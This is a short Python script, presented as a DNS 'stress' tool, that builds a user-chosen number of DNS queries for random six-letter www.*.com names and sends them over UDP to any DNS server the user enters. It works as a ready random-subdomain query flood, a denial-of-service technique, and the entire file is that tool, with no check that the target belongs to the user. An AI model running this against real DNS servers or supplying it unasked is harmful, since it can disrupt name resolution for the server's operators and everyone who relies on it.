import random
import sys
import struct
import socket

limit = input('Enter the number of queries you wanna send: ')
dns_server = input('Enter the DNS server to be stressed: ')
summa = int(limit)

dandanakka = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
at_work = []
new_list=[]
ada = 0

def build_packet(url):
    packet = struct.pack(">H", random.randrange(1,65535))  # Query Ids
    packet += struct.pack(">H", 256)  # Flags
    packet += struct.pack(">H", 1)  # Questions
    packet += struct.pack(">H", 0)  # Answers
    packet += struct.pack(">H", 0)  # Authorities
    packet += struct.pack(">H", 0)  # Additional
    split_url = url.split(".")
    for part in split_url:
        packet += struct.pack("B", len(part))
        for byte in (part):
            packet += struct.pack("c", bytes(byte, 'utf-8'))
    packet += struct.pack("B", 0)  # End of String
    packet += struct.pack(">H", 1)  # Query Type
    packet += struct.pack(">H", 1)  # Query Class
    return packet

while True:
    idhu = "".join([dandanakka[random.randrange(0, len(dandanakka))] for i in range(6)])
    at_work.append("www."+idhu+".com")
    ada = ada+1
    if ada == summa:
        break

for i in at_work:
    new_list.append(build_packet(i))

def sendqueries(queries):
    b = 0
    skt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    skt.bind(("",5000))
    for i in new_list:
        skt.sendto(bytes(i), (str(dns_server), 53))
        b = b+1
        sys.stdout.write("\r Sent "+ str(b))
        sys.stdout.flush()

sendqueries(new_list)
